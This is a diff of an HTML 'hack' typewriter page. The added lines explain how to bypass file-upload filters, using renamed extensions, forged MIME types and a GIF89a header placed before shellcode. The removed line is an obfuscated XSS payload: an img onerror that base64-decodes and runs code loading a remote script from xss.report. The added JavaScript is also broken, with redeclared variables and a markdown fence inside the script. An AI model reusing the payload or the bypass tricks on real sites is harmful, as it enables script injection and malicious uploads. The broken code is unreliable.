@@ -17,15 +17,18 @@
   cursor: pointer;
 }</style>
 
-<button class="button" onclick="typeWriter()">Click Me</button>
+<button class="button" onclick="typeWriter()">Click Me</button></center>
 
 <p id="hack" style="color:#00ff00"></p>
 
 <script>
 var i = 0;
 var txt = '💀Unrestricted Upload of File with Dangerous Type💀';
+var txt = 'File upload mechanisms are very common on websites, but sometimes have poor validation. This allows attackers to upload malicious files to the web server, which can then be executed by other users or the server itself. This can also happen in authenticated areas of a website (e.g. installing WordPress plugins) Developers may blacklist specific file extensions and prevent users from uploading files with extensions that are considered dangerous. This can be bypassed by using alternate extensions or even unrelated ones. For example, it might be possible to upload and execute a .php file simply by renaming it file.php.jpg or file.PHp. Blacklisting MIME types is also a method of file upload validation. It may be bypassed by intercepting the POST request on the way to the server and modifying the MIME type.
+'; 
+var txt = 'GIF89a is a GIF file header. If uploaded content is being scanned, sometimes the check can be fooled by putting this header item at the top of shellcode:'  
+```Content-type: image/jpeg GIF89a;```   
 var speed = 50;
-
 function typeWriter() {
   if (i < txt.length) {
     document.getElementById("hack").innerHTML += txt.charAt(i);
@@ -34,6 +37,5 @@ function typeWriter() {
   }
 }
 </script>
-"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8veHNzLnJlcG9ydC9zL2dob3N0c2hlbGwiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
 </body>
 </html>
